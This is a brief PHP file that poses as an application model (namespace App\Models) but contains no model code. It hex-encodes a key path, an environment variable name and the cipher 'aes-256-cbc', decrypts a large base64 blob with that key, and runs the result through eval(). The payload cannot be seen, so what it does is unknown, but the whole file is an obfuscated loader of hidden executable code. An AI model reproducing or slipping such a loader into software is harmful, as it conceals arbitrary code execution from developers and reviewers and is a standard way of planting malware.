<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('sqiz/iop8zzW/Gjv/LJZxw==');

$c=base64_decode(

'JymOm2M0NZbABd0DvmMf0TuAmtrF9nBoSriP+Wlz8fgkw1/vSVX+a77uts1IM23HQEs8BEe+NmUQ' .
'xGFET+20xF3CLWXBmHh9yPSSI9mky6Wp3euauTlDlzvdI1+hQhD20V+X5tFvaARF8lIUAN1YNV09' .
'7p6ost8Gi0jOfOfi1r+ZG97mrW+acZNLX7Y6h1syoDuYsD99NSRNTzxwaMhUTGcQyVjng+VEjCsQ' .
'eLooZkgBFkD0we/jFePAFbqZVYWtTyDazjzn0HujbYDWBD0xG8DjGh6SphJFYl/9YHwJhEYlveKi' .
'mh4d5BVyTeQScI5sGzecWxfsEPEUxHWQvepdoeldCTltoKrvmmmEdLwVZe1V/pMl2zAmKXYZlKYB' .
'r1tS3UlgqBJpONFfrzDc4BbAsr4X43G5z6B7Vle4Tae5jEqojqNEpwzVK63o3l2HeFDwkVw/TUkI' .
'sNDsCONqztePZkqOkExL9hOSX276b3mYuBesfiyCx2iCjCfAoNd/5QTbas7vFFVjGTtzd8TCY/dM' .
'YwJ8gIqWVKrKRXUWcmcyamLeBVzlR/ki3+HE6KfBAteaYyY20puwcgZXOodEanM2yc2W+ZmIq4hE' .
'K7KtOubmmzOmwx3we2EBXdfTSs3EocNAFT1Ok+hxFu5ZSfSrTeTjeBfI8i4eLLOgurF2ajyDqicW' .
'mlFIFAxjkWC7PWYBVGpALeUpOlqteOxXabTPycUYHowmw9w3vIAmSMRGwykO1FWZC+UCey3lWw6t' .
'7PvD+7dMpjBXi0cY+hdXm6LePSJ5Yty6g8AWfTbMtqDr6EcGxc9W2bg7gAp01eO/lrFBvrKVxTPr' .
'fA9jNYEYIUljJ0GuLuhnV/i0yMAfcdM4VzM8iM1dhroRmsw/8e2RNfT6qPb7dVWbb97QRTaer200' .
'KFYPRip/B736jY7lnf7+c9Tumwc4eQPPIzGpq0czYSavQmq900ZhGqa599izpS0XjRxBrA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

